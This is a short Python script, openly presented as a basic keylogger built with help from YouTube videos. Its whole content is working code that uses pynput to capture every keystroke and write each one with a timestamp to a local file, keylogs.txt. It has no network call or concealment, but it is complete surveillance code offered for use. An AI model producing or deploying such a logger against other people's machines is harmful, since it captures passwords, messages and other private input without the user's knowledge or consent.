#!/bin/python3
"""
#This is a basic keylogger created with the help of Youtbe videos.
"""

import pynput
from pynput.keyboard import Key, Listener
import logging

log_dir = "" #Directory for log file to be placed in (uses directory keylogger is stored in)

logging.basicConfig(filename=(log_dir + "keylogs.txt"), #Name of file to record keystrokes
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
